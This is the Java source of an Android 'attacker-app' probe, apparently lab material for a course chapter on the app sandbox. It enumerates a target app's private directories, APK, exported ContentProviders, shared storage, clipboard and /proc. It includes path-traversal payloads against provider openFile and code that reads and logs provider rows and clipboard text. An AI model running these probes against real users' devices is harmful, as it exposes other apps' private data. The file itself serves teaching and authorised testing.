/*
 * ProbeActivity.java — 21-App-Sandbox / examples/attacker-app
 *
 * WHAT IT DOES
 *     Runs as an ordinary, unprivileged third-party application and
 *     systematically enumerates what it can reach of ANOTHER app on the same
 *     device: that app's private data directory, its shipped code, its exported
 *     ContentProviders, what it left on shared storage, the clipboard, its
 *     processes in /proc, and how much of the package list is visible at all.
 *
 *     Every check produces one of five verdicts — REACHABLE, DENIED, ABSENT,
 *     ERROR, INCONCLUSIVE — and the report is written both to logcat (tag
 *     SANDBOXPROBE) and to a selectable TextView you can screenshot.
 *
 * WHY IT MATTERS
 *     `adb shell` is UID 2000 in the SELinux domain `shell`, with no seccomp
 *     filter and privileges no application holds. Demonstrating something there
 *     does not show that an app can do it. This APK is the second experiment,
 *     and only its results support the sentence "any app the user installs can
 *     do this".
 *
 *     Read the output as two categories. Every DENIED line is the sandbox doing
 *     its job. Every REACHABLE line is something the sandbox was never designed
 *     to stop — and that is where the findings are.
 *
 *     See ../../README.md sections 3.14, 5.8 and 9.3, and
 *     ../../labs/lab-03-attacker-app.md.
 *
 * HOW TO RUN
 *     # host
 *     gradle -p 21-App-Sandbox/examples/attacker-app assembleDebug
 *     adb install -r 21-App-Sandbox/examples/attacker-app/build/outputs/apk/debug/attacker-app-debug.apk
 *     adb logcat -c
 *     adb shell am start -n com.attacker.sandboxprobe/.ProbeActivity --es target com.example.target
 *     adb logcat -s SANDBOXPROBE:W
 *
 *     Run a subset while iterating:
 *     # adb shell
 *     am start -n com.attacker.sandboxprobe/.ProbeActivity \
 *        --es target com.example.target \
 *        --es only identity,data,provider,storage
 *
 *     Valid phase names: identity, data, apk, provider, storage, clipboard,
 *     procfs, visibility.
 *
 * REQUIREMENTS
 *     JDK 11 or 17, Gradle 7.5+ or Android Studio, Android SDK with the
 *     compileSdk in build.gradle. No device root. No third-party dependency —
 *     not even AndroidX — deliberately: this APK is evidence, and the fewer
 *     non-platform classes it contains, the less room there is to argue the
 *     result came from something other than the APIs any app can call.
 *
 * SAFETY AND AUTHORISATION
 *     This app reads. It does not write to, modify, or delete anything
 *     belonging to another application. It is still an app that enumerates other
 *     applications' data, which is a criminal offence on a device you do not own
 *     in many jurisdictions regardless of intent. Use a dedicated test device.
 *     Keep it off the Play Store; it would be flagged, correctly, as a
 *     Potentially Harmful Application.
 */

package com.attacker.sandboxprobe;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ProviderInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Process;
import android.util.Log;
import android.view.Gravity;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.InputStream;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class ProbeActivity extends Activity {

    private static final String TAG = "SANDBOXPROBE";

    /** Change this, or override at launch with --es target <pkg>. */
    private static final String DEFAULT_TARGET = "com.example.target";

    /* ---------------------------------------------------------- verdicts --
     *
     * These five are not interchangeable. The difference between them is the
     * difference between a finding and an anecdote.
     *
     *   REACHABLE     succeeded from an ordinary app UID. The strongest claim
     *                 available without root: "an unprivileged third-party
     *                 application can ...".
     *   DENIED        the platform refused us. Record it — ruling things out is
     *                 part of the work, and a report that says what is SAFE is
     *                 more credible than one that only lists problems.
     *   ABSENT        does not exist, OR package visibility filtering is hiding
     *                 it. Write nothing until you have re-checked <queries>.
     *   ERROR         the target accepted the request and then threw. STILL
     *                 REACHABLE: the door opened, the room behind it was untidy.
     *                 Often the most interesting result, because an unhandled
     *                 exception means the input reached real code.
     *   INCONCLUSIVE  the API cannot tell us. Go and get the missing evidence.
     */
    private enum V { REACHABLE, DENIED, ABSENT, ERROR, INCONCLUSIVE }

    private final StringBuilder out = new StringBuilder();
    private String target = DEFAULT_TARGET;
    private Set<String> phases = null;   // null == run everything

    // -------------------------------------------------------------- lifecycle

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        String t = getIntent().getStringExtra("target");
        if (t != null && t.length() > 0) target = t;

        String only = getIntent().getStringExtra("only");
        if (only != null && only.length() > 0) {
            phases = new HashSet<>(Arrays.asList(only.split(",")));
        }

        TextView tv = new TextView(this);
        tv.setTextIsSelectable(true);
        tv.setTextSize(9f);
        tv.setPadding(12, 12, 12, 12);
        tv.setGravity(Gravity.START);
        ScrollView sv = new ScrollView(this);
        sv.addView(tv);
        setContentView(sv);

        header();
        if (phase("identity"))   probeIdentity();
        if (phase("visibility")) probeVisibility();
        if (phase("data"))       probePrivateData();
        if (phase("apk"))        probeShippedCode();
        if (phase("provider"))   probeExportedProviders();
        if (phase("storage"))    probeSharedStorage();
        if (phase("clipboard"))  probeClipboard();
        if (phase("procfs"))     probeProcFs();
        footer();

        tv.setText(out.toString());
    }

    private boolean phase(String name) { return phases == null || phases.contains(name); }

    // ---------------------------------------------------------------- output

    private void section(String s) {
        line("");
        line("================ " + s + " ================");
    }

    private void row(String area, String what, V v, String detail) {
        line(String.format("%-11s %-52s %-13s %s", area, trunc(what, 52), v, detail));
    }

    private void row(String area, String what, V v) { row(area, what, v, ""); }

    private void note(String s) { line("    " + s); }

    private void line(String s) {
        Log.w(TAG, s);
        out.append(s).append('\n');
    }

    private static String trunc(String s, int n) {
        if (s == null) return "null";
        return s.length() <= n ? s : "…" + s.substring(s.length() - (n - 1));
    }

    private static String oneLine(String s, int n) {
        if (s == null) return "null";
        String c = s.replace('\n', ' ').replace('\r', ' ');
        return c.length() <= n ? c : c.substring(0, n) + "…";
    }

    // ---------------------------------------------------------------- header

    private void header() {
        line("=========================================================================");
        line("  SANDBOX REACHABILITY PROBE — chapter 21");
        line("  Run from an ORDINARY app UID. Not from adb shell. That is the point.");
        line("=========================================================================");
        line("target            = " + target);
        line("android release   = " + Build.VERSION.RELEASE + "  (sdk " + Build.VERSION.SDK_INT + ")");
        line("security patch    = " + (Build.VERSION.SDK_INT >= 23 ? Build.VERSION.SECURITY_PATCH : "?"));
        line("fingerprint       = " + Build.FINGERPRINT);
        line("probe targetSdk   = " + getApplicationInfo().targetSdkVersion);
        note("Record all of the above in the report. Half the platform's mitigations");
        note("are targetSdk-gated, so a finding that is real against an app targeting");
        note("API 28 may be impossible against the same source targeting API 34.");
    }

    // ------------------------------------------------------- 0. our identity

    private void probeIdentity() {
        section("0. WHO WE ARE — read this before anything else");

        int uid = Process.myUid();
        ApplicationInfo me = getApplicationInfo();

        row("identity", "uid", V.REACHABLE, String.valueOf(uid));
        row("identity", "userId (uid / 100000)", V.REACHABLE, String.valueOf(uid / 100000));
        row("identity", "appId  (uid % 100000)", V.REACHABLE, String.valueOf(uid % 100000));
        row("identity", "our own dataDir", V.REACHABLE, me.dataDir);
        row("identity", "FLAG_DEBUGGABLE", V.REACHABLE,
                String.valueOf((me.flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0));

        for (String key : new String[]{"Uid", "Gid", "Groups", "CapBnd", "CapEff",
                                       "Seccomp", "NoNewPrivs"}) {
            String v = procStatus(key);
            row("kernel", key, v == null ? V.INCONCLUSIVE : V.REACHABLE, v == null ? "" : v);
        }
        String ctx = readFile("/proc/self/attr/current");
        row("kernel", "selinux context", ctx == null ? V.INCONCLUSIVE : V.REACHABLE,
                ctx == null ? "" : ctx.trim());

        String groups = procStatus("Groups");
        boolean inet = groups != null && (" " + groups + " ").contains(" 3003 ");
        row("kernel", "GID 3003 (AID_INET = INTERNET)", inet ? V.REACHABLE : V.ABSENT);

        note("Expect: app-range uid, Seccomp 2, NoNewPrivs 1, CapBnd all zeros, and");
        note("a u:r:untrusted_app*:s0:c... context. Those are the constraints of any");
        note("app the user installs — and nothing like an adb shell, which has");
        note("Seccomp 0, a non-empty CapBnd, and the domain u:r:shell:s0.");
        note("Paste this block at the top of the evidence appendix. It is what makes");
        note("everything below mean something.");
    }

    // -------------------------------------------------- 1. package visibility

    private void probeVisibility() {
        section("1. CAN WE SEE THE TARGET AT ALL? (check this before believing ABSENT)");

        PackageManager pm = getPackageManager();
        try {
            PackageInfo pi = pm.getPackageInfo(target, 0);
            row("visibility", "getPackageInfo(" + target + ")", V.REACHABLE,
                    "uid=" + pi.applicationInfo.uid
                    + " targetSdk=" + pi.applicationInfo.targetSdkVersion
                    + " debuggable=" + ((pi.applicationInfo.flags
                            & ApplicationInfo.FLAG_DEBUGGABLE) != 0));
        } catch (Exception e) {
            row("visibility", "getPackageInfo(" + target + ")", V.ABSENT,
                    e.getClass().getSimpleName());
            note("*** STOP. Either the target is not installed, or package visibility");
            note("*** filtering is hiding it from us. Add the target to <queries> in");
            note("*** AndroidManifest.xml and rebuild. Until you have done that, EVERY");
            note("*** ABSENT below is meaningless.");
        }

        List<ApplicationInfo> all = pm.getInstalledApplications(0);
        int third = 0;
        for (ApplicationInfo ai : all) {
            if ((ai.flags & ApplicationInfo.FLAG_SYSTEM) == 0) third++;
        }
        row("visibility", "packages visible to us", V.REACHABLE,
                all.size() + " total, " + third + " third-party");
        note("On targetSdk 30+ without <queries> or QUERY_ALL_PACKAGES this list is");
        note("FILTERED. It is a privacy control, not a security boundary: it never");
        note("makes an exported component unreachable, it only hides it from apps");
        note("that did not ask.");
    }

    // ------------------------------------------------ 2. the target's data dir

    private void probePrivateData() {
        section("2. THE TARGET'S PRIVATE DATA DIRECTORY — the sandbox's core claim");

        ApplicationInfo ai = appInfo(target);
        if (ai == null) {
            row("data", "applicationInfo", V.ABSENT, "target not visible; see section 1");
            return;
        }

        String[] paths = {
            ai.dataDir,
            ai.dataDir + "/shared_prefs",
            ai.dataDir + "/databases",
            ai.dataDir + "/files",
            ai.dataDir + "/cache",
            "/data/data/" + target,
            "/data/user_de/0/" + target
        };
        for (String p : paths) {
            File f = new File(p);
            V v;
            if (!f.exists())      v = V.DENIED;      // stat() itself is refused
            else if (f.canRead()) v = V.REACHABLE;
            else                  v = V.DENIED;
            String[] kids = f.list();
            row("data", p, v, "exists=" + f.exists() + " read=" + f.canRead()
                    + " entries=" + (kids == null ? "null" : String.valueOf(kids.length)));
        }

        note("DENIED across the board is the CORRECT result and is what the sandbox");
        note("exists to produce. The directory is mode 0700 owned by uid " + ai.uid + ",");
        note("and the missing execute bit means we cannot even traverse into it to");
        note("stat() a file inside — so a careless 0666 file in there is still");
        note("unreachable BY US. SELinux MCS categories deny it a second time.");
        note("");
        note("If any line above says REACHABLE, check for android:sharedUserId first:");
        note("  adb shell dumpsys package " + target + " | grep -i sharedUser");
        note("Two apps with one UID are ONE sandbox.");
    }

    // ------------------------------------------------- 3. the target's code

    private void probeShippedCode() {
        section("3. THE TARGET'S SHIPPED CODE — readable, by design");

        ApplicationInfo ai = appInfo(target);
        if (ai == null) { row("apk", "applicationInfo", V.ABSENT); return; }

        File apk = new File(ai.sourceDir);
        row("apk", ai.sourceDir, apk.canRead() ? V.REACHABLE : V.DENIED,
                "size=" + (apk.canRead() ? apk.length() : -1));

        File libs = new File(ai.nativeLibraryDir);
        String[] so = libs.list();
        row("apk", ai.nativeLibraryDir, libs.canRead() ? V.REACHABLE : V.DENIED,
                "entries=" + (so == null ? "null" : String.valueOf(so.length)));

        if (ai.splitSourceDirs != null) {
            for (String s : ai.splitSourceDirs) {
                row("apk", s, new File(s).canRead() ? V.REACHABLE : V.DENIED);
            }
        }

        note("REACHABLE here is not a vulnerability — it is the platform's design.");
        note("The APK is mode 0644 owned by system, and PackageManager hands out its");
        note("path. The consequence is the finding: EVERYTHING shipped inside an APK");
        note("is public. Any BuildConfig field, string resource, asset, or bundled");
        note(".so has been published to every user and every app on the device.");
        note("Pull it and look:  adb pull " + ai.sourceDir + " && jadx -d out ./base.apk");
    }

    // ------------------------------------------- 4. doors the developer opened

    private void probeExportedProviders() {
        section("4. EXPORTED CONTENT PROVIDERS — doors, not walls");

        PackageManager pm = getPackageManager();
        PackageInfo pi;
        try {
            pi = pm.getPackageInfo(target, PackageManager.GET_PROVIDERS);
        } catch (Exception e) {
            row("provider", "getPackageInfo(GET_PROVIDERS)", V.ABSENT,
                    e.getClass().getSimpleName());
            return;
        }

        if (pi.providers == null || pi.providers.length == 0) {
            row("provider", "declared providers", V.ABSENT, "none");
            return;
        }

        for (ProviderInfo p : pi.providers) {
            if (!p.exported) {
                row("provider", p.authority, V.DENIED, "not exported");
                continue;
            }
            if (p.readPermission != null) {
                row("provider", p.authority, V.INCONCLUSIVE,
                        "guarded by " + p.readPermission
                        + "  — check its protectionLevel before believing it");
                continue;
            }

            Uri base = Uri.parse("content://" + p.authority);
            queryOne("provider", base);

            // Path traversal against openFile(). The attacker names a file; the
            // TARGET opens it, with the target's authority, and returns a
            // descriptor the kernel will never recheck. Escape class 5.
            String[] payloads = {
                "input.txt",
                "../shared_prefs/prefs.xml",
                "../databases/app.db",
                "../../shared_prefs/prefs.xml",
                "../../../../system/etc/hosts"
            };
            for (String seg : payloads) openOne("provider", base, seg);
        }

        note("A REACHABLE query() means any installed app reads that data — no");
        note("permission, no prompt, no user interaction. A REACHABLE openFile()");
        note("with a traversal payload is worse: it grants the TARGET's entire read");
        note("authority, because the target opened the file itself and the kernel");
        note("checks permissions once, at open(), in the OPENING process.");
        note("");
        note("A null cursor is NOT a denial — the path may simply not match the");
        note("provider's UriMatcher. Harvest real paths from the decompiled code:");
        note("  jadx -d out target.apk && grep -rn 'addURI' out/sources/");
        note("See ../../../27-ContentProviders/ for the full treatment.");
    }

    private void queryOne(String area, Uri uri) {
        Cursor c = null;
        try {
            c = getContentResolver().query(uri, null, null, null, null);
            if (c == null) {
                row(area, "query " + uri, V.INCONCLUSIVE,
                        "null cursor — path may not match the UriMatcher");
                return;
            }
            StringBuilder sb = new StringBuilder();
            sb.append("rows=").append(c.getCount()).append(" cols=");
            String[] names = c.getColumnNames();
            for (int i = 0; i < names.length; i++) {
                if (i > 0) sb.append(',');
                sb.append(names[i]);
            }
            if (c.moveToFirst()) {
                sb.append(" first=[");
                for (int i = 0; i < c.getColumnCount() && i < 6; i++) {
                    if (i > 0) sb.append('|');
                    try { sb.append(c.getString(i)); } catch (Exception e) { sb.append('?'); }
                }
                sb.append(']');
            }
            row(area, "query " + uri, V.REACHABLE, oneLine(sb.toString(), 160));
        } catch (SecurityException e) {
            row(area, "query " + uri, V.DENIED, e.getClass().getSimpleName());
        } catch (IllegalArgumentException e) {
            row(area, "query " + uri, V.ABSENT,
                    "Unknown URL — provider missing OR hidden by <queries>");
        } catch (Exception e) {
            // The door opened and the room behind it was untidy. Still reachable.
            row(area, "query " + uri, V.ERROR,
                    e.getClass().getSimpleName() + ": " + oneLine(e.getMessage(), 80));
        } finally {
            if (c != null) try { c.close(); } catch (Exception ignored) { }
        }
    }

    private void openOne(String area, Uri base, String seg) {
        Uri uri = Uri.withAppendedPath(base, seg);
        InputStream in = null;
        try {
            in = getContentResolver().openInputStream(uri);
            if (in == null) {
                row(area, "openFile " + seg, V.INCONCLUSIVE, "null stream");
                return;
            }
            byte[] buf = new byte[512];
            int n = in.read(buf);
            row(area, "openFile " + seg, V.REACHABLE,
                    n <= 0 ? "(empty)" : oneLine(new String(buf, 0, n), 120));
        } catch (SecurityException e) {
            row(area, "openFile " + seg, V.DENIED, e.getClass().getSimpleName());
        } catch (java.io.FileNotFoundException e) {
            row(area, "openFile " + seg, V.ABSENT, "FileNotFoundException");
        } catch (Exception e) {
            row(area, "openFile " + seg, V.ERROR,
                    e.getClass().getSimpleName() + ": " + oneLine(e.getMessage(), 80));
        } finally {
            if (in != null) try { in.close(); } catch (Exception ignored) { }
        }
    }

    // -------------------------------------------------------- 5. outside the wall

    private void probeSharedStorage() {
        section("5. WHAT THE TARGET PUT OUTSIDE ITS SANDBOX");

        String[] paths = {
            "/storage/emulated/0",
            "/storage/emulated/0/Download",
            "/storage/emulated/0/Documents",
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Android/data",
            "/storage/emulated/0/Android/data/" + target,
            "/storage/emulated/0/Android/obb/" + target,
            "/data/local/tmp"
        };
        for (String p : paths) {
            File f = new File(p);
            String[] kids = f.list();
            V v;
            if (!f.exists())      v = V.ABSENT;
            else if (f.canRead()) v = V.REACHABLE;
            else                  v = V.DENIED;
            row("storage", p, v, "entries=" + (kids == null ? "null" : String.valueOf(kids.length)));
        }

        File own = getExternalFilesDir(null);
        row("storage", "our own external files dir", own != null ? V.REACHABLE : V.ABSENT,
                own == null ? "" : own.getAbsolutePath());

        note("/data/local/tmp is DENIED to us and readable from adb shell. That single");
        note("row is the whole methodological argument of this chapter in one line.");
        note("");
        note("Anything the target wrote to shared storage has LEFT the sandbox");
        note("permanently: it survives the target's uninstall, and can be inherited");
        note("by whatever app later receives the target's recycled appId. On API 30+");
        note("direct listing is restricted, but files in public collections remain");
        note("discoverable via MediaStore — with a media permission, which is itself");
        note("part of the finding and must be stated.");
    }

    // ---------------------------------------------------------- 6. clipboard

    private void probeClipboard() {
        section("6. THE CLIPBOARD — a system-wide shared buffer, by design");
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null) { row("clipboard", "service", V.ABSENT); return; }
            ClipData clip = cm.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) {
                row("clipboard", "primaryClip", V.ABSENT, "empty, or we lack focus");
            } else {
                CharSequence t = clip.getItemAt(0).coerceToText(this);
                row("clipboard", "primaryClip", V.REACHABLE,
                        oneLine(String.valueOf(t), 120));
            }
        } catch (Exception e) {
            row("clipboard", "primaryClip", V.DENIED,
                    e.getClass().getSimpleName() + ": " + oneLine(e.getMessage(), 60));
        }
        note("Since Android 10 an app may read the clipboard ONLY while it holds input");
        note("focus or is the default IME, so this probe must be in the foreground.");
        note("Android 12 shows a toast on a foreign read; Android 13 auto-clears");
        note("sensitive content. State the version, the app state and the user");
        note("interaction required, or the finding will not survive review.");
        note("The durable defect is on the TARGET's side: putting a credential on a");
        note("system-wide buffer at all, without ClipDescription.EXTRA_IS_SENSITIVE.");
    }

    // ------------------------------------------------------------- 7. /proc

    private void probeProcFs() {
        section("7. /proc VISIBILITY — a side channel that was closed");

        String[] pids = new File("/proc").list(new java.io.FilenameFilter() {
            public boolean accept(File d, String n) {
                for (int i = 0; i < n.length(); i++)
                    if (!Character.isDigit(n.charAt(i))) return false;
                return n.length() > 0;
            }
        });
        row("procfs", "numeric entries visible in /proc", V.REACHABLE,
                pids == null ? "null" : String.valueOf(pids.length));

        boolean sawTarget = false;
        if (pids != null) {
            for (String pid : pids) {
                String cmd = readFile("/proc/" + pid + "/cmdline");
                if (cmd != null && cmd.replace("\0", "").startsWith(target)) sawTarget = true;
            }
        }
        row("procfs", "target process visible", sawTarget ? V.REACHABLE : V.DENIED);

        String[] files = { "/proc/net/tcp", "/proc/net/arp", "/proc/1/status",
                           "/proc/self/status", "/data/system/packages.list" };
        for (String p : files) {
            File f = new File(p);
            row("procfs", p, f.canRead() ? V.REACHABLE : V.DENIED,
                    "exists=" + f.exists());
        }

        note("From Android 10, /proc is hardened so an app sees only its OWN");
        note("processes. AID_READPROC (GID 3009) lifts this and no ordinary app has");
        note("it. If a probe of yours worked on an old device and returns nothing on");
        note("a new one, this is usually why.");
    }

    // --------------------------------------------------------------- footer

    private void footer() {
        section("HOW TO READ THIS");
        line("  Every DENIED line is the sandbox doing its job.");
        line("  Every REACHABLE line is something the sandbox was NEVER DESIGNED to stop.");
        line("");
        line("  Now do the part no tool does for you: for each REACHABLE row, walk the");
        line("  reach-through. What can you make that thing do that you could not do");
        line("  directly? A door is only as serious as the room behind it.");
        line("");
        line("  And run the OTHER experiment. Repeat every check from adb shell and put");
        line("  the two columns side by side. Where they differ, this column is the");
        line("  honest one for a claim about apps.");
        line("");
        line("  Capture evidence:");
        line("    adb logcat -d -s SANDBOXPROBE:W > evidence/sandbox-probe.txt");
        line("    adb exec-out screencap -p       > evidence/sandbox-probe.png");
    }

    // ----------------------------------------------------------------- util

    private ApplicationInfo appInfo(String pkg) {
        try {
            return getPackageManager().getApplicationInfo(pkg, 0);
        } catch (Exception e) {
            return null;
        }
    }

    private static String readFile(String path) {
        BufferedReader r = null;
        try {
            r = new BufferedReader(new FileReader(path));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = r.readLine()) != null) sb.append(l).append('\n');
            return sb.toString();
        } catch (Exception e) {
            return null;
        } finally {
            if (r != null) try { r.close(); } catch (Exception ignored) { }
        }
    }

    private static String procStatus(String key) {
        String all = readFile("/proc/self/status");
        if (all == null) return null;
        for (String l : all.split("\n")) {
            if (l.startsWith(key + ":")) {
                return l.substring(key.length() + 1).trim().replaceAll("\\s+", " ");
            }
        }
        return null;
    }
}
